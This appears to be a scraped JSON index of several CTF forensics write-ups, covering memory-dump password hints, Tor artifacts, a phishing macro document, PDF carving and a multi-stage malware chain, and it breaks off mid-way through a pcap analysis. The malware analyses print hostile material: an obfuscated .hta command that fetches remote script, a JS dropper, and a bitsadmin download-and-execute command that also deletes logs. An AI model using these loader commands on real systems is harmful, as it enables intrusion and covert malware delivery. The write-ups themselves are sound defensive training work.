look for the location of the password hint inside SAM:\nThis question in the following Stackexchange forum not only tells us where to look, but how to decrypt – or rather decode – it:\nThe post on the forum can be found at:\nhttps://security.stackexchange.com/questions/264896/is-there-a-way-to-get-windows-login-password-hint-from-sam-hive-with-volatility Going back to Volatility, we will query for the password hint based on the suggested path in the stackexchange forum:\nThe option “printkey -K” will print the information in the specified path. We see some Subkeys (imagine them as subfolders). These Subkeys are actually the users of the windows\tmachine written as codes instead of names. The answer of the question in the stackexchange suggests to use the after the “\\Users” Subkey. Using the first user code as the , we get:\nWe don’t see any password hint. Repeating for the rest of the users, we get a match at the usercode “000003E9”:\nOne way to recover the plaintext form of this (as the stackexchange answer suggested) is by the sample code provided in the answer. Another way is to make our own python script. But first, let’s understand a little bit more what this format we are looking at really is:\nSo the password hint is basically stored as hex with pairs of zeros in between each value. To recover the plaintext format, we have to:\nRemove dots: 4300540046004C00490042007B003500... Remove pairs of zeros: 4354464C49427B35... Convert from hex to bytes: flag = \u0026#34;4354464C49427B35305F6C306E365F7933375F35305F7733346B5F5F5F7D\u0026#34; print(bytes.fromhex(flag).decode()) Running the above two-liner script, we get the flag:\n┌──(connar㉿kali)-[~/hintingflags]\r└─$ python decryptingHint.py\rCTFLIB{50_l0n6_y37_50_w34k___} Another way is using the online tool “CyberChef”:\n","permalink":"http://localhost:1313/ctfwriteups/hintingflags/","summary":"Extracting the contents of the zip file, we are met with a \u0026ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:\nVolatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.","title":"Hinting flags - Writeup"},{"content":"The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale. So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:\nA google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.db implies this as well).\nOpening the challenge file in autopsy, we are met with the filesystem of the suspect user:\nAs it was stated earlier, we need to find proof of leaks to some stolen database marketplace. The way to go about solving this challenge is to make the critical thought on how could someone access such market. This is because, to leak information to a website, you must first visit it. One could think that the normal browsing history of the user would lead him to the answer but this is the wrong way to approach this problem. Online markets such as the one we are searching for is not accessible through normal browsers, but through a browser such as Tor.\nSo now we have to search on where information about Tor browser is stored. In other words, we want to do a forensic investigation on Tor browser. It is not a prerequisite to know where to search, so we will use google to find the answer.\nAmongst some articles, a great presentation about Tor forensics suggests looking in the following path:\nNavigating to these folders and enumerating a bit, we find a search query of the Tor Browser:\nWe see that a query for the infamous raid forums darknet market was made which contained the flag with some url encoding in it. We can use the online CyberChef tool to decode the flag:\n","permalink":"http://localhost:1313/ctfwriteups/insider/","summary":"The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale. So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:\nA google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.","title":"Insider - Writeup"},{"content":"We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.\nThe goldfynch is the easier option so that’s what we are going to use:\nOpening the email, we view what seems to be a very sus message from presumably the IRS:\nAn archive is provided to the victim with a password set to recover the form. Archives with a password are usually a technique threat actors use to avoid detection of their malicious documents, since if the document had not been zipped with a password, gmail would not have allowed it to be sent. Anyway, let’s download and open it. Using the provided password, we get a Microsoft word file:\nMake sure to disable your windows defender if it automatically deletes the file after extraction (if you use windows to solve this chall). I will be using kali for this one.\nThe email implied that a form would be provided for the victim to fill and send to another goofie email, but we see just an image trying to convince the victim to enable macros (btw this image was taken by a real phishing campaign using irs) :\nLet’s view the macros that will get executed after we click enable. You can do it with either the olevba suite or with just enabling the developer tab in word and view them manually.\nRunning the command olevba [document], we get the following sus vba macros:\nWe see that this script is inside an AutoOpen sub, which means this will be executed as soon as the enable macros has been clicked.\nAlthough we see some seemingly legitimate but unused variables (which is usually used to change the entropy of the file), there are some keypoints to notice here.\nFirst off, we see the line “tt = ThisDocument.BuiltInDocumentProperties(\u0026ldquo;Content status\u0026rdquo;).Value” which tries to get something from the document properties, specifically the content status value.\nThen, it takes this value and reverses it in the line “oinfer = StrReverse(tt)”.\nAfter that, we have a very sus line “jjfre = Chr(112) \u0026amp; Chr(111) \u0026amp; Chr(119) …” which creates a command with the Chr() method. Let’s run this line and see what is been created:\n\u0026gt;\u0026gt;\u0026gt; jjfre = jjfre.replace(\u0026#34;Chr\u0026#34;, \u0026#34;chr\u0026#34;).replace(\u0026#34;\u0026amp;\u0026#34;, \u0026#34;+\u0026#34;) \u0026gt;\u0026gt;\u0026gt; eval(jjfre) \u0026#39;powershell.exe -WindowsStyle -ExecutionPolicy Bypass -Command\u0026#39; I have not placed the whole command yet since we don’t know at this point what the content status value is that is being used in this command, but essentially a powershell command is being constructed.\nAt the very end, we see that this powershell command is being executed in hidden mode with the line “CreateObject(\u0026ldquo;WScript.Shell\u0026rdquo;).Run jjfre, 0, False”.\nLet’s try and find what the content status value is that is being reversed and then used. You can either do it manually through the document info-\u0026gt;properties-\u0026gt;show all or by unzipping the document itself and observe its actual structure:\nSearching through the files, we eventually find in the DocumentSummaryInformation a very sus string:\nReversing it, as the vba code implied, we get this clearer powershell obfuscated script:\nA good way in general to deobfuscate fast scripts like this is to just run it in an isolated vm/online powershell interpreters like tio.run.\nUsing an isolated vm and disabling windows defender, we get this deobfuscated script:\nWe see some replacement operations being done in some initial variables, so let’s mimic the operations:\nNice! So we see some urls that the script tries to reach and download and execute a dll hosted to one of them.\nSince there is nothing more to it, let’s observe the urls. They kinda look like b64 so if we try to decode the files that each url tries to get, we eventually get a hit on h[x][x]p://romancebrazil.com/gallery/9/Q1RGTElCezVuMzR8PHlfTTM3NGQ0NzR9/:\n\u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; b64decode(b\u0026#34;Q1RGTElCezVuMzR8PHlfTTM3NGQ0NzR9\u0026#34;) b\u0026#39;CTFLIB{5n34}\u0026lt;y_M374d474}\u0026#39; \u0026gt;\u0026gt;\u0026gt; This is it for this one :)\n","permalink":"http://localhost:1313/ctfwriteups/irswentphishing/","summary":"We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.\nThe goldfynch is the easier option so that’s what we are going to use:\nOpening the email, we view what seems to be a very sus message from presumably the IRS:\nAn archive is provided to the victim with a password set to recover the form.","title":"IRS went phishing - Writeup"},{"content":"We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:\nPagefile.sys is a system file in Windows set aside for your computer\u0026#39;s Random Access Memory (RAM), also known as physical memory. When your computer\u0026#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn\u0026#39;t need, such as files and apps. So based on that, we conclude that pagefile.sys has files and apps inside it and from the description of the challenge we are looking for a pdf file. But how can we extract it ?\nBy doing a little bit of research, we find that we can extract files based on their hex representation where we can view file headers and map the beginning and end of a file. A program that converts bytes of a file or program to hex is HxD which can be found at:\nhttps://mh-nexus.de/en/hxd/ So all we have to do after we download the tool is to load the given challenge file and search for start of file and end of file headers for pdf files. The whole hex block between these two corresponding pdf headers will be the file we want to extract. We will copy this block and save it as a new file with pdf extension at the end. If we have found the correct block for a presumable pdf file, it will open with no errors for us to view. So let’s begin.\nSearching for pdf file headers, we find the following table:\nWhere the second column is the start of file signature in hex (header) and the third column are all the possible end of file signatures in hex for pdf files of Adobe (since the challenge itself refers to Adobe Reader).\nTo extract pdf files based on the headers, we first need to search for the starting header of the pdf. This can be done by using CTRL+F and writing the hex values of the pdf header. After doing so, we will find many pdfs, such as the following:\nNow we need to find where this pdf ends. Searching some of the end of file (EOF) signatures from the table we saw earlier, we get to this offset:\nNow, there are two ways to extract the block for this pdf:\nHard way: Highlight and scroll all the way from the start of file signature until the end of file signature. Easy way: Right click on the highlighted start of file signature and select “select block” option. In the menu that will appear, use the end of file signature location we found and select the whole block. The method we are going to use is the easy one.\nStarting off, we find the start of file signature and click “select block”:\nWe take note of this address. We then do the same for the end of file signature:\nWe then use the starting offset we took note off earlier.\nNow, by clicking OK, the whole block is highlighted for us. We copy the whole block and save it in a new file as a pdf:\nLet’s open the file we just extracted to see if this is the correct pdf file. Remember that the pdf the user was reading had to do with virtual memory:\nThis is not the correct pdf since it has nothing to do with virtual memory theory. But it is a good lead since this picture is a meme for “never giving up”.\nNot giving up and continuing our “carving” (as depicted in the picture), we find the next occurrence of the corresponding version of pdf and by following the same process as before and end up with this pdf:\nSo this is probably the correct pdf.\nNow we have to analyze it since the description of the challenge states it is malicious.\nOne common thing for malicious pdf files is that they have javascript embedded in them, which gets executed upon opening/closing the pdf. And this is exactly what the description stated.\nOne traditional way of analyzing pdf files is by opening them in a text editor, such as notepad:\nAnalyzing a pdf from a text editor is not an easy task. Pdf’s have a strange structure. In short, they contain objects and each object points to another object.\nOne good thing about opening pdf files in text editor as an initial analysis step is that we can spot that javascript actually exists in the pdf:\nWe see that object 41 has a reference to javascript and it points to another object, the object 42. Object 42 as we can see contains javascript code that has been encoded with FlateEncoder. So this is as far as we can get with text editor analysis.\nTo continue our analysis, we can use existing tools such as “peepdf” which has the ability to extract javascript from pdf files.\nNavigating to a VM (since this is supposedly malware), we download the peepdf tool from its github repository and run it. The repository is the following:\nhttps://github.com/jesparza/peepdf Running the tool in python2, we get the following:\nWe can see that some objects have javascript code in them. Specifically, we can see that the object that has javascript code in it is the object 42, the same object we previously found in the text editor analysis:\nIt might be confusing of what this javascript code does since its been obfuscated but it basically XOR’s every element of a list with the number 5, then converts it to a string and adds it to an empty string. When the loop is finished, a final string has been contructed, which is used inside a SOAP request.\nTo deobfuscate this code, let’s open an online javascript editor and change the SOAP.connect command to console.log in order to print the constructed string instead of connecting to it:\nBy doing that, we get the flag.\n","permalink":"http://localhost:1313/ctfwriteups/malwarecarving/","summary":"We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:\nPagefile.sys is a system file in Windows set aside for your computer\u0026#39;s Random Access Memory (RAM), also known as physical memory. When your computer\u0026#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn\u0026#39;t need, such as files and apps.","title":"Malware Carving - Writeup"},{"content":"This is a writeup for the babufscation challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.\nBy doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.\nWe can export all the files through File\u0026ndash;\u0026gt;Export Objects\u0026ndash;\u0026gt;HTTP.\nLet\u0026rsquo;s start analyzing the first file: \u0026ldquo;noticeJuly.hta\u0026rdquo; Running the file, we are met with the following window:\nOpening the file in a text editor, we observe the following fake looking page:\nWe see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:\nLet\u0026rsquo;s analyze this command that is being run. The command is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;\\u0055\\u004c\\u0064\\u002b\\u0044\\u0055\\u004c\\u0064\\u002b\\u0045\\u0055\\u004c\\u0064\\u002b\\u0022\\u002f\\u002f\\u0063\\u0030\\u0072\\u0061\\u0078\\u002e\\u0065\\u0070\\u0068\\u0033\\u006b\\u0064\\u006f\\u006c\\u006d\\u0066\\u0061\\u002e\\u0063\\u006c\\u006f\\u0075\\u0064\\u002f\\u003f\\u0032\\u002f\\u0022\\u0029\\u003b\u0026#39;;SSG=\u0026#39;\\u003a\\u0068\\u0022\\u003b\\u0045\\u0055\\u004c\\u0064\\u003d\\u0022\\u0054\\u0074\\u0022\\u002b\\u0022\\u0050\\u003a\\u0022\\u003b\\u0047\\u0065\\u0074\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0028\\u0043\u0026#39;;PEBC=\u0026#39;\\u0076\\u0061\\u0072\\u0020\\u0043\\u0055\\u004c\\u0064\\u003d\\u0022\\u0073\\u0022\\u002b\\u0022\\u0063\\u0072\\u0022\\u003b\\u0044\\u0055\\u004c\\u0064\\u003d\\u0022\\u0069\\u0070\\u0074\\u0022\\u002b\\u0022\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Firstly, let\u0026rsquo;s take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:\nCyberChef Command The command that is left is the following:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c \u0026#34;S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1\u0026amp;\u0026amp;S^eT UFWN=!SSG!^KGRAAKR.JS\u0026amp;\u0026amp;\u0026lt;nul set/p LAXA=var LAXA=\u0026#39;ULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;);\u0026#39;;SSG=\u0026#39;:h\u0026#34;;EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;;GetObject(C\u0026#39;;PEBC=\u0026#39;var CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;;DULd=\u0026#34;ipt\u0026#34;+\u0026#34;\u0026#39;;UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! \u0026#34; Analyzing the command, here are the takeaways:\nC:\\Windows\\System32\\cONhosT.exe %COMSpeC% /V/D/c: It will open a cmd window with the /V/D/c parameters. S^eT SSG=C:\\kfldeokgr\\\u0026amp;\u0026amp; mD !SSG!\u0026gt;nul 2\u0026gt;\u0026amp;1: Sets a variable SSG to a path and then creats this path using mD (an alias for make directory), redirecting the output accordingly. S^eT UFWN=!SSG!^PEBCPADO.JS: Sets the previously mentioned path with a .js filename to the variable UFWN. \u0026lt;nul set/p LAXA=var LAXA='ULd+DULd+EULd+\u0026quot;//c0rax.eph3kdolmfa.cloud/?2/\u0026quot;);';\rSSG=':h\u0026quot;;EULd=\u0026quot;Tt\u0026quot;+\u0026quot;P:\u0026quot;;GetObject(C';PEBC='var CULd=\u0026quot;s\u0026quot;+\u0026quot;cr\u0026quot;;DULd=\u0026quot;ipt\u0026quot;+\u0026quot;';\rUFWN=PEBC+SSG+LAXA: This basically creates some javascript code and stores it in the LAXA variable. PADO=new Function(UFWN);PADO(): This creates a js function with the code set in UFWN variable and runs it. By deobfuscating the js code, we are basically left with this code:\nvar CULd=\u0026#34;s\u0026#34;+\u0026#34;cr\u0026#34;; DULd=\u0026#34;ipt\u0026#34;+\u0026#34;:h\u0026#34;; EULd=\u0026#34;Tt\u0026#34;+\u0026#34;P:\u0026#34;; GetObject(CULd+DULd+EULd+\u0026#34;//c0rax.eph3kdolmfa.cloud/?2/\u0026#34;); //which basically is--\u0026gt; script:http://c0rax.eph3kdolmfa.cloud/?2/ This is all for the .hta file. It creates a .js file. This .js file creates an instance of a COM object retrieved from the specified url.\nFinally, by using \u0026gt;!UFWN!|caLl !UFWN!||caLl !UFWN! the .js file is run. That\u0026rsquo;s all for this .hta file. Now let\u0026rsquo;s move to the second pcap which contains the .js code retrieved, which is the stage 2 of the attack.\nThe code in the .js file is the following:\nvar lt135 = \u0026#34;QCVwcm9ncmFtZmlsZXM6fjE1LDElJWNvbXNwZWM6fi0xMiwxJSVjb21zcGVjOn4xNCwxJSVwcm9ncmFtZmlsZXM6fjEwLDElJz1eIj4lY29tbW9ucHJvZ3JhbWZpbGVzOn4#%MiwxJXUlcHJvZ3JhbWZpbGVzOn4xM#%wxJSZAJWNvbXNwZWM6fi0zLDElJWNvbXNwZWM6fjIwLDElaCVjb21tb25wcm9ncmFtZmlsZXM6fjE4LDElJWNvbW1vbnB#%b2d#%YW1maWxlczp+MjMsMSUlY29tbW9ucHJvZ3JhbWZpbGVzOn4tMTEsMSVmZiZAJWNvbW1vbnB#%b2d#%YW1maWxlczp+LTEsMSUlY29tc3BlYzp+LTEsMSUlY29tc3BlYzp+LTEzLDElJXB#%b2d#%YW1maWxlczp+LTYsMSUnPSVvczp+NSwxJV5eXi1eXl43Xl5eJXBh---snip---\u0026#34; var re = new RegExp(\u0026#34;#%\u0026#34;, \u0026#34;g\u0026#34;); lt135 = lt135.replace(re, \u0026#34;y\u0026#34;); var gj4fjrg = WScript.CreateObject(\u0026#34;WScript.Shell\u0026#34;); var fkfo3l = gj4fjrg.ExpandEnvironmentStrings(\u0026#34;%appdata%\u0026#34;); var whshis4 = fkfo3l + \u0026#34;\\\\kQiFcryrxG.bat\u0026#34;; var dcdd = decodeBase64(lt135); writeBytes(whshis4, dcdd); gj4fjrg.run(\u0026#34;\\\u0026#34;\u0026#34; + whshis4 + \u0026#34;\\\u0026#34;\u0026#34;); This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file. By following the same operations, we end up with this .bat file:\nThis kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let\u0026rsquo;s save it and upload it to VirusTotal to see what I mean:\nThe thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: \u0026ldquo;BatchEncryption\u0026rdquo;. Let\u0026rsquo;s google this and see what comes up:\nDamn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com. There is also the corresponding tool to decode the whole .bat file for us! This tool exists in this repo:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder (its the first google search result we got previously). By building this tool and running it, we get the deobfuscated bat code which is\u0026hellip;another obfuscated command:\nThe new command we are called to deobfuscate is:\ncmd /V /C \u0026#34;set shgyngmcqs=0XoY\u0026amp;Ndh%Cas3WlpPRn\\meFQwgf/U2D5T:.k tbzri*uMc\u0026amp;\u0026amp;FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%A,1!\u0026amp;\u0026amp; IF %A==1337 CALL %xqzwdomkia:~-213%\u0026#34; If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let\u0026rsquo;s use python to deobfuscate this:\nNote: The technique used is an existing one and is called \u0026ldquo;forencoding obfuscation\u0026rdquo;.\nThe result we get is the following bitsadmin command:\nbitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat %tmp%\\\\t.bat \u0026amp; %tmp%\\\\t.bat \u0026amp; sc stop bits \u0026amp; timeout 5 \u0026amp; del /Q /F C:\\\\ProgramData\\\\Microsoft\\\\Network\\\\Downloader\\\\* \u0026amp; sc start bits Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job\u0026rsquo;s name is really sus and if we decode it from b64 we get the first part of the flag:\nNice. All that\u0026rsquo;s left is the last .bat file in the remaining pcap. Opening it, we get another obfuscated .bat file different than the previous one:\nAgain, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously? Loading the file in VT, we get another interesting name:\nIt is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:\nSo basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:\nhttps://github.com/Dump-GUY/Get-UnJlaive This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:\nIf we run the file command on the .exe, we see its a Mono/.NET assembly:\n└─$ file t.bat_orig.exe t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Loading the executable to DnSpy, we are met with\u0026hellip;another seemingly obfuscated file:\nThis executable seems to have been packed with some .NET packer. This time, VT won\u0026rsquo;t be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class \u0026ldquo;cab44dfc2d326bea8c4438eb03ca73b4d\u0026rdquo;:\nusing System; using System.Reflection; namespace A { // Token: 0x02000007 RID: 7 internal class cab44dfc2d326bea8c4438eb03ca73b4d { // Token: 0x0600001A RID: 26 RVA: 0x00003868 File Offset: 0x00001A68 private static string ccea6e29829419d8153060be40cf7772a(Assembly cdefd3af7ac5b57777d7057f73f12ed1e) { string text = cdefd3af7ac5b57777d7057f73f12ed1e.FullName; int num = text.IndexOf(\u0026#39;,\u0026#39;); if (num \u0026gt;= 0) { text = text.Substring(0, num); } return text; } // Token: 0x0600001B RID: 27 RVA: 0x00003898 File Offset: 0x00001A98 internal static void c5b6799dda81c5313f25256842d094434() { string text = \u0026#34;638492234169640792\u0026#34;; DateTime dateTime = new DateTime(long.Parse(text)); if (DateTime.Now \u0026gt; dateTime) { for (;;) { switch (4) { case 0: continue; } break; } if (!true) { RuntimeMethodHandle runtimeMethodHandle = methodof(cab44dfc2d326bea8c4438eb03ca73b4d.c5b6799dda81c5313f25256842d094434()).MethodHandle; } string text2 = cab44dfc2d326bea8c4438eb03ca73b4d.ccea6e29829419d8153060be40cf7772a(Assembly.GetExecutingAssembly()); string text3 = string.Concat(new string[] { \u0026#34;The assembly \u0026#39;\u0026#34;, text2, \u0026#34;\u0026#39; is created with an evaluation version of CryptoObfuscator and will stop working on \u0026#34;, dateTime.ToString(\u0026#34;d-MMM-yyyy.\u0026#34;), \u0026#34; The evaluation period has expired and the application will now exit.\u0026#34; }); throw new Exception(text3); } } } } CryptoObfuscator! The only thing that is left to do is to find the corresponding tool to deobfuscate the executable for us. The one I will use can be found in the following repo:\nhttps://github.com/Rhotav/Crypto-Deobfuscator Building and running the tool, we get the deobfuscated file:\nSearching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:\nFull flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}\n","permalink":"http://localhost:1313/ctfwriteups/mranderson/","summary":"This is a writeup for the babufscation challenge This challenge gives us a zip file containing 3 pcap files:\nWhat we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.\nWe can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.","title":"Mr Anderson - Writeup"},{"content":"Starting the analysis A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.\nOpening the file with Wireshark, we can view all the requests.\nThe request that is of interest is the one made to themrbeas7.org and is the following:\nGET /christmasGiveaway/index.html HTTP/1.1 Host: themrbeas7.org User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 HTTP/1.0 200 OK Server: Apache/2.4.43 (FreeBSD) Date: Mon, 04 Dec 2023 10:09:52 GMT Content-type: text/html Content-Length: 10649 Last-Modified: Sun, 03 Dec 2023 17:25:38 GMT \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;img/Favicon.png\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Xmas Giveaway\u0026lt;/title\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/jquery.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/timer.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;js/script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/font-awesome.min.css\u0026#34;\u0026gt; \u0026lt;link href=\u0026#39;http://fonts.googleapis.com/css?family=Lobster\u0026#39; rel=\u0026#39;stylesheet\u0026#39; type=\u0026#39;text/css\u0026#39;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;css/custom.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body onload=\u0026#34;countdown(year,month,day,hour,minute)\u0026#34;\u0026gt; \u0026lt;!-- Carousel --\u0026gt; \u0026lt;div id=\u0026#34;myCarousel\u0026#34; class=\u0026#34;carousel slide\u0026#34; data-ride=\u0026#34;carousel\u0026#34;\u0026gt; \u0026lt;!-- Indicators --\u0026gt; \u0026lt;ol class=\u0026#34;carousel-indicators\u0026#34;\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;0\u0026#34; class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;1\u0026#34; \u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li data-target=\u0026#34;#myCarousel\u0026#34; data-slide-to=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;div class=\u0026#34;carousel-inner\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;container timer\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;home\u0026#34; class= \u0026#34;logo text-center\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;font color=\u0026#34;red\u0026#34;\u0026gt;Christmas is almost here\u0026lt;/font\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row timer-circle\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;main-text text-center\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;sub-text\u0026#34;\u0026gt;Giveaway countdown\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;numbers\u0026#34; id=\u0026#34;count2\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;col-lg-12 col-md-12 col-sm-12 col-xs-12 text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;circle text-center\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= \u0026#34;spacer1\u0026#34;\u0026gt; \u0026lt;div class= \u0026#34;title\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;numbers\u0026#34; id= \u0026#34;dday\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class= \u0026#34;row\u0026#34; id= 